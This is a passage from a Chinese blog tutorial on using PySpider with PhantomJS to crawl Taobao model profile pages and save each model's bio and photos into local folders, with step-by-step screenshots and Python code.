                  <p>这句命令的意思是，运行 pyspider 并 启动它的所有组件。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/E6632A0A-9067-4B97-93A2-5DEF23FB4CD8.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/E6632A0A-9067-4B97-93A2-5DEF23FB4CD8-1024x658.jpg" alt="E6632A0A-9067-4B97-93A2-5DEF23FB4CD8"></a> 可以发现程序已经正常启动，并在 5000 这个端口运行。</p>
                  <h2 id="一触即发"><a href="#一触即发" class="headerlink" title="一触即发"></a>一触即发</h2>
                  <p>接下来在浏览器中输入 <a href="http://localhost:5000" target="_blank" rel="noopener">http://localhost:5000</a>，可以看到 PySpider 的主界面，点击右下角的 Create，命名为 taobaomm，当然名称你可以随意取，继续点击 Create。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160325-0@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160325-0@2x-1024x397.png" alt="QQ20160325-0@2x"></a> 这样我们会进入到一个爬取操作的页面。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160325-1@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160325-1@2x-1024x592.png" alt="QQ20160325-1@2x"></a> 整个页面分为两栏，左边是爬取页面预览区域，右边是代码编写区域。下面对区块进行说明： 左侧绿色区域：这个请求对应的 JSON 变量，在 PySpider 中，其实每个请求都有与之对应的 JSON 变量，包括回调函数，方法名，请求链接，请求数据等等。 绿色区域右上角 Run：点击右上角的 run 按钮，就会执行这个请求，可以在左边的白色区域出现请求的结果。 左侧 enable css selector helper: 抓取页面之后，点击此按钮，可以方便地获取页面中某个元素的 CSS 选择器。 左侧 web: 即抓取的页面的实时预览图。 左侧 html: 抓取页面的 HTML 代码。 左侧 follows: 如果当前抓取方法中又新建了爬取请求，那么接下来的请求就会出现在 follows 里。 左侧 messages: 爬取过程中输出的一些信息。 右侧代码区域: 你可以在右侧区域书写代码，并点击右上角的 Save 按钮保存。 右侧 WebDAV Mode: 打开调试模式，左侧最大化，便于观察调试。</p>
                  <h2 id="乘胜追击"><a href="#乘胜追击" class="headerlink" title="乘胜追击"></a>乘胜追击</h2>
                  <p>依然是上一节的那个网址，<a href="https://mm.taobao.com/json/request_top_list.htm?page=1" target="_blank" rel="noopener">https://mm.taobao.com/json/request_top_list.htm?page=1</a>，其中 page 参数代表页码。所以我们暂时抓取前 30 页。页码到最后可以随意调整。 首先我们定义基地址，然后定义爬取的页码和总页码。</p>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">from pyspider.libs.base_handler import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handler</span>(<span class="title">BaseHandler</span>):</span></span><br><span class="line">    crawl_config = &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.base_url = <span class="string">'https://mm.taobao.com/json/request_top_list.htm?page='</span></span><br><span class="line">        <span class="keyword">self</span>.page_num = <span class="number">1</span></span><br><span class="line">        <span class="keyword">self</span>.total_num = <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    @every(minutes=<span class="number">24</span> * <span class="number">60</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_start</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">self</span>.page_num &lt;= <span class="keyword">self</span>.<span class="symbol">total_num:</span></span><br><span class="line">            url = <span class="keyword">self</span>.base_url + str(<span class="keyword">self</span>.page_num)</span><br><span class="line">            print url</span><br><span class="line">            <span class="keyword">self</span>.crawl(url, callback=<span class="keyword">self</span>.index_page)</span><br><span class="line">            <span class="keyword">self</span>.page_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    @config(age=<span class="number">10</span> * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">index_page</span><span class="params">(<span class="keyword">self</span>, response)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> response.doc(<span class="string">'a[href^="http"]'</span>).items()<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">self</span>.crawl(each.attr.href, callback=<span class="keyword">self</span>.detail_page)</span><br><span class="line"></span><br><span class="line">    @config(priority=<span class="number">2</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detail_page</span><span class="params">(<span class="keyword">self</span>, response)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">"url"</span>: response.url,</span><br><span class="line">            <span class="string">"title"</span>: response.doc(<span class="string">'title'</span>).text(),</span><br><span class="line">        &#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>点击 save 保存代码，然后点击左边的 run，运行代码。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160325-2@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160325-2@2x-1024x597.png" alt="QQ20160325-2@2x"></a> 运行后我们会发现 follows 出现了 30 这个数字，说明我们接下来有 30 个新请求，点击可查看所有爬取列表。另外控制台也有输出，将所有要爬取的 URL 打印了出来。 然后我们点击左侧任意一个绿色箭头，可以继续爬取这个页面。例如点击第一个 URL，来爬取这个 URL <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160325-3@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160325-3@2x-1024x347.png" alt="QQ20160325-3@2x"></a> 点击之后，再查看下方的 web 页面，可以预览实时页面，这个页面被我们爬取了下来，并且回调到 index_page 函数来处理，目前 index_page 函数我们还没有处理，所以是继续构件了所有的链接请求。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160325-4@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160325-4@2x-949x1024.png" alt="QQ20160325-4@2x"></a> 好，接下来我们怎么办？当然是进入到 MM 到个人页面去爬取了。</p>
                  <h2 id="如火如荼"><a href="#如火如荼" class="headerlink" title="如火如荼"></a>如火如荼</h2>
                  <p>爬取到了 MM 的列表，接下来就要进入到 MM 详情页了，修改 index_page 方法。</p>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_page</span><span class="params">(<span class="keyword">self</span>, response)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> response.doc(<span class="string">'.lady-name'</span>).items()<span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.crawl(each.attr.href, callback=<span class="keyword">self</span>.detail_page)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>其中 response 就是刚才爬取的列表页，response 其实就相当于列表页的 html 代码，利用 doc 函数，其实是调用了 PyQuery，用 CSS 选择器得到每一个 MM 的链接，然后重新发起新的请求。 比如，我们这里拿到的 each.attr.href 可能是 <a href="http://mm.taobao.com/self/model_card.htm?user_id=687471686" target="_blank" rel="noopener">mm.taobao.com/self/model_card.htm?user_id=687471686</a>，在这里继续调用了 crawl 方法，代表继续抓取这个链接的详情。</p>
                  <figure class="highlight oxygene">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">self</span>.crawl(<span class="keyword">each</span>.attr.href, callback=<span class="keyword">self</span>.detail_page)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>然后回调函数就是 detail_page，爬取的结果会作为 response 变量传过去。detail_page 接到这个变量继续下面的分析。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160325-7@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160325-7@2x-1024x620.png" alt="QQ20160325-7@2x"></a> 好，我们继续点击 run 按钮，开始下一个页面的爬取。得到的结果是这样的。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160325-5@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160325-5@2x-864x1024.png" alt="QQ20160325-5@2x"></a> 哦，有些页面没有加载出来，这是为什么？ 在之前的文章说过，这个页面比较特殊，右边的页面使用 JS 渲染生成的，而普通的抓取是不能得到 JS 渲染后的页面的，这可麻烦了。 然而，幸运的是，PySpider 提供了动态解析 JS 的机制。 友情提示：可能有的小伙伴不知道 PhantomJS，可以参考 <a href="http://cuiqingcai.com/2599.html">爬虫 JS 动态解析</a> 因为我们在前面装好了 PhantomJS，所以，这时候就轮到它来出场了。在最开始运行 PySpider 的时候，使用了<code>pyspider all</code>命令，这个命令是把 PySpider 所有的组件启动起来，其中也包括 PhantomJS。 所以我们代码怎么改呢？很简单。</p>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_page</span><span class="params">(<span class="keyword">self</span>, response)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> response.doc(<span class="string">'.lady-name'</span>).items()<span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.crawl(each.attr.href, callback=<span class="keyword">self</span>.detail_page, fetch_type=<span class="string">'js'</span>)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>只是简单地加了一个 fetch_type=’js’，点击绿色的返回箭头，重新运行一下。 可以发现，页面已经被我们成功加载出来了，简直不能更帅！ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160325-9@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160325-9@2x-1004x1024.png" alt="QQ20160325-9@2x"></a> 看下面的个性域名，所有我们需要的 MM 图片都在那里面了，所以我们需要继续抓取这个页面。</p>
                  <h2 id="胜利在望"><a href="#胜利在望" class="headerlink" title="胜利在望"></a>胜利在望</h2>
                  <p>好，继续修改 detail_page 方法，然后增加一个 domain_page 方法，用来处理每个 MM 的个性域名。</p>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detail_page</span><span class="params">(<span class="keyword">self</span>, response)</span></span><span class="symbol">:</span></span><br><span class="line">    domain = <span class="string">'https:'</span> + response.doc(<span class="string">'.mm-p-domain-info li &gt; span'</span>).text()</span><br><span class="line">    print domain</span><br><span class="line">    <span class="keyword">self</span>.crawl(domain, callback=<span class="keyword">self</span>.domain_page)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">domain_page</span><span class="params">(<span class="keyword">self</span>, response)</span></span><span class="symbol">:</span></span><br><span class="line">    pass</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>好，继续重新 run，预览一下页面，终于，我们看到了 MM 的所有图片。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160326-0@2x.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/03/QQ20160326-0@2x-1024x546.png" alt="QQ20160326-0@2x"></a> 嗯，你懂得！</p>
                  <h2 id="只欠东风"><a href="#只欠东风" class="headerlink" title="只欠东风"></a>只欠东风</h2>
                  <p>好，照片都有了，那么我们就偷偷地下载下来吧～ 完善 domain_page 代码，实现保存简介和遍历保存图片的方法。 在这里，PySpider 有一个特点，所有的 request 都会保存到一个队列中，并具有去重和自动重试机制。所以，我们最好的解决方法是，把每张图片的请求都写成一个 request，然后成功后用文件写入即可，这样会避免图片加载不全的问题。 曾经在之前文章写过图片下载和文件夹创建的过程，在这里就不多赘述原理了，直接上写好的工具类，后面会有完整代码。</p>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">import os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Deal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.path = DIR_PATH</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">self</span>.path.endswith(<span class="string">'/'</span>)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">self</span>.path = <span class="keyword">self</span>.path + <span class="string">'/'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="keyword">self</span>.path)<span class="symbol">:</span></span><br><span class="line">            os.makedirs(<span class="keyword">self</span>.path)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mkDir</span><span class="params">(<span class="keyword">self</span>, path)</span></span><span class="symbol">:</span></span><br><span class="line">        path = path.strip()</span><br><span class="line">        dir_path = <span class="keyword">self</span>.path + path</span><br><span class="line">        exists = os.path.exists(dir_path)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="symbol">exists:</span></span><br><span class="line">            os.makedirs(dir_path)</span><br><span class="line">            <span class="keyword">return</span> dir_path</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            <span class="keyword">return</span> dir_path</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">saveImg</span><span class="params">(<span class="keyword">self</span>, content, path)</span></span><span class="symbol">:</span></span><br><span class="line">        f = open(path, <span class="string">'wb'</span>)</span><br><span class="line">        f.write(content)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">saveBrief</span><span class="params">(<span class="keyword">self</span>, content, dir_path, name)</span></span><span class="symbol">:</span></span><br><span class="line">        file_name = dir_path + <span class="string">"/"</span> + name + <span class="string">".txt"</span></span><br><span class="line">        f = open(file_name, <span class="string">"w+"</span>)</span><br><span class="line">        f.write(content.encode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getExtension</span><span class="params">(<span class="keyword">self</span>, url)</span></span><span class="symbol">:</span></span><br><span class="line">        extension = url.split(<span class="string">'.'</span>)[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> extension</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里面包含了四个方法。</p>
                  <blockquote>
                    <p>mkDir：创建文件夹，用来创建 MM 名字对应的文件夹。 saveBrief: 保存简介，保存 MM 的文字简介。 saveImg: 传入图片二进制流以及保存路径，存储图片。 getExtension: 获得链接的后缀名，通过图片 URL 获得。</p>
                  </blockquote>
                  <p>然后在 domain_page 中具体实现如下</p>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">domain_page</span><span class="params">(<span class="keyword">self</span>, response)</span></span><span class="symbol">:</span></span><br><span class="line">    name = response.doc(<span class="string">'.mm-p-model-info-left-top dd &gt; a'</span>).text()</span><br><span class="line">    dir_path = <span class="keyword">self</span>.deal.mkDir(name)</span><br><span class="line">    brief = response.doc(<span class="string">'.mm-aixiu-content'</span>).text()</span><br><span class="line">    <span class="keyword">if</span> <span class="symbol">dir_path:</span></span><br><span class="line">        imgs = response.doc(<span class="string">'.mm-aixiu-content img'</span>).items()</span><br><span class="line">        count = <span class="number">1</span></span><br><span class="line">        <span class="keyword">self</span>.deal.saveBrief(brief, dir_path, name)</span><br><span class="line">        <span class="keyword">for</span> img <span class="keyword">in</span> <span class="symbol">imgs:</span></span><br><span class="line">            url = img.attr.src</span><br><span class="line">            <span class="keyword">if</span> <span class="symbol">url:</span></span><br><span class="line">                extension = <span class="keyword">self</span>.deal.getExtension(url)</span><br><span class="line">                file_name = name + str(count) + <span class="string">'.'</span> + extension</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">self</span>.crawl(img.attr.src, callback=<span class="keyword">self</span>.save_img,</span><br><span class="line">                           save=&#123;<span class="string">'dir_path'</span>: dir_path, <span class="string">'file_name'</span>: file_name&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_img</span><span class="params">(<span class="keyword">self</span>, response)</span></span><span class="symbol">:</span></span><br><span class="line">    content = response.content</span><br><span class="line">    dir_path = response.save[<span class="string">'dir_path'</span>]</span><br><span class="line">    file_name = response.save[<span class="string">'file_name'</span>]</span><br><span class="line">    file_path = dir_path + <span class="string">'/'</span> + file_name</span><br><span class="line">    <span class="keyword">self</span>.deal.saveImg(content, file_path)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>以上方法首先获取了页面的所有文字，然后调用了 saveBrief 方法存储简介。 然后遍历了 MM 所有的图片，并通过链接获取后缀名，和 MM 的姓名以及自增计数组合成一个新的文件名，调用 saveImg 方法保存图片。</p>
                  <h2 id="炉火纯青"><a href="#炉火纯青" class="headerlink" title="炉火纯青"></a>炉火纯青</h2>
                  <p>好，基本的东西都写好了。 接下来。继续完善一下代码。第一版本完成。 <strong>版本一功能：按照淘宝 MM 姓名分文件夹，存储 MM 的 txt 文本简介以及所有美图至本地。</strong> 可配置项：</p>
                  <blockquote>
                    <ul>
                      <li>PAGE_START: 列表开始页码</li>
                      <li>PAGE_END: 列表结束页码</li>
                      <li>DIR_PATH: 资源保存路径</li>
                    </ul>
                  </blockquote>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Created on 2016-03-25 00:59:45</span></span><br><span class="line"><span class="comment"># Project: taobaomm</span></span><br><span class="line"></span><br><span class="line">from pyspider.libs.base_handler import *</span><br><span class="line"></span><br><span class="line">PAGE_START = <span class="number">1</span></span><br><span class="line">PAGE_END = <span class="number">30</span></span><br><span class="line">DIR_PATH = <span class="string">'/var/py/mm'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handler</span>(<span class="title">BaseHandler</span>):</span></span><br><span class="line">    crawl_config = &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.base_url = <span class="string">'https://mm.taobao.com/json/request_top_list.htm?page='</span></span><br><span class="line">        <span class="keyword">self</span>.page_num = PAGE_START</span><br><span class="line">        <span class="keyword">self</span>.total_num = PAGE_END</span><br><span class="line">        <span class="keyword">self</span>.deal = Deal()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_start</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">self</span>.page_num &lt;= <span class="keyword">self</span>.<span class="symbol">total_num:</span></span><br><span class="line">            url = <span class="keyword">self</span>.base_url + str(<span class="keyword">self</span>.page_num)</span><br><span class="line">            <span class="keyword">self</span>.crawl(url, callback=<span class="keyword">self</span>.index_page)</span><br><span class="line">            <span class="keyword">self</span>.page_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">index_page</span><span class="params">(<span class="keyword">self</span>, response)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> response.doc(<span class="string">'.lady-name'</span>).items()<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">self</span>.crawl(each.attr.href, callback=<span class="keyword">self</span>.detail_page, fetch_type=<span class="string">'js'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detail_page</span><span class="params">(<span class="keyword">self</span>, response)</span></span><span class="symbol">:</span></span><br><span class="line">        domain = response.doc(<span class="string">'.mm-p-domain-info li &gt; span'</span>).text()</span><br><span class="line">        <span class="keyword">if</span> <span class="symbol">domain:</span></span><br><span class="line">            page_url = <span class="string">'https:'</span> + domain</span><br><span class="line">            <span class="keyword">self</span>.crawl(page_url, callback=<span class="keyword">self</span>.domain_page)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">domain_page</span><span class="params">(<span class="keyword">self</span>, response)</span></span><span class="symbol">:</span></span><br><span class="line">        name = response.doc(<span class="string">'.mm-p-model-info-left-top dd &gt; a'</span>).text()</span><br><span class="line">        dir_path = <span class="keyword">self</span>.deal.mkDir(name)</span><br><span class="line">        brief = response.doc(<span class="string">'.mm-aixiu-content'</span>).text()</span><br><span class="line">        <span class="keyword">if</span> <span class="symbol">dir_path:</span></span><br><span class="line">            imgs = response.doc(<span class="string">'.mm-aixiu-content img'</span>).items()</span><br><span class="line">            count = <span class="number">1</span></span><br><span class="line">            <span class="keyword">self</span>.deal.saveBrief(brief, dir_path, name)</span><br><span class="line">            <span class="keyword">for</span> img <span class="keyword">in</span> <span class="symbol">imgs:</span></span><br><span class="line">                url = img.attr.src</span><br><span class="line">                <span class="keyword">if</span> <span class="symbol">url:</span></span><br><span class="line">                    extension = <span class="keyword">self</span>.deal.getExtension(url)</span><br><span class="line">                    file_name = name + str(count) + <span class="string">'.'</span> + extension</span><br><span class="line">                    count += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">self</span>.crawl(img.attr.src, callback=<span class="keyword">self</span>.save_img,</span><br><span class="line">                               save=&#123;<span class="string">'dir_path'</span>: dir_path, <span class="string">'file_name'</span>: file_name&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save_img</span><span class="params">(<span class="keyword">self</span>, response)</span></span><span class="symbol">:</span></span><br><span class="line">        content = response.content</span><br><span class="line">        dir_path = response.save[<span class="string">'dir_path'</span>]</span><br><span class="line">        file_name = response.save[<span class="string">'file_name'</span>]</span><br><span class="line">        file_path = dir_path + <span class="string">'/'</span> + file_name</span><br><span class="line">        <span class="keyword">self</span>.deal.saveImg(content, file_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Deal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.path = DIR_PATH</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">self</span>.path.endswith(<span class="string">'/'</span>)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">self</span>.path = <span class="keyword">self</span>.path + <span class="string">'/'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="keyword">self</span>.path)<span class="symbol">:</span></span><br><span class="line">            os.makedirs(<span class="keyword">self</span>.path)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mkDir</span><span class="params">(<span class="keyword">self</span>, path)</span></span><span class="symbol">:</span></span><br><span class="line">        path = path.strip()</span><br><span class="line">        dir_path = <span class="keyword">self</span>.path + path</span><br><span class="line">        exists = os.path.exists(dir_path)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="symbol">exists:</span></span><br><span class="line">            os.makedirs(dir_path)</span><br><span class="line">            <span class="keyword">return</span> dir_path</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            <span class="keyword">return</span> dir_path</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">saveImg</span><span class="params">(<span class="keyword">self</span>, content, path)</span></span><span class="symbol">:</span></span><br><span class="line">        f = open(path, <span class="string">'wb'</span>)</span><br><span class="line">        f.write(content)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">saveBrief</span><span class="params">(<span class="keyword">self</span>, content, dir_path, name)</span></span><span class="symbol">:</span></span><br><span class="line">        file_name = dir_path + <span class="string">"/"</span> + name + <span class="string">".txt"</span></span><br><span class="line">        f = open(file_name, <span class="string">"w+"</span>)</span><br><span class="line">        f.write(content.encode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">    <span 